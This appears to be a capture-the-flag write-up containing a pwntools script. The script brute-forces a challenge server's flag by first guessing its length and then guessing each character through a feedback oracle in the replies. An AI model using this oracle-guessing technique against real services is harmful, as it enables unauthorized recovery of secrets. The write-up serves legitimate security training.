# Solution

1. Need to do some form of socket programming. Following code requires pwntools to be installed:

    ```python
    #!/usr/bin/python3
    from pwn import *
    def send_data(data):
        try:
            server_ip = "localhost" # or change it to the IP address of the server.
            p = remote(server_ip,6765)
            print("Sending data: "+data+", length: "+str(len(data)))
            p.sendline(data.encode('utf-8'))
            res = p.recvall()
            p.close()
            return res.decode('utf-8')
        
        except EOFError:
            return ""
    # guess the length first
    flag_length = 0
    for i in range(1,40):
        payload = "A"*i
        res = send_data(payload)
        print(res)
        if "length" in res:
            flag_length = i
            break
        else:
            continue
    f_ind = 0
    flag = [x for x in (str(chr(33) * flag_length))]
    while f_ind < flag_length:
        # construct the placeholder first
        for j in range(33,127):
            flag[f_ind] = chr(j)
            test_flag = ''.join(flag)
            res = send_data(test_flag)
            indicator = "Character "+str(f_ind)
            if indicator in res:
                flag = [x for x in test_flag]
                f_ind += 1
                break
    final_flag = ''.join(flag)
    print(final_flag)
    ```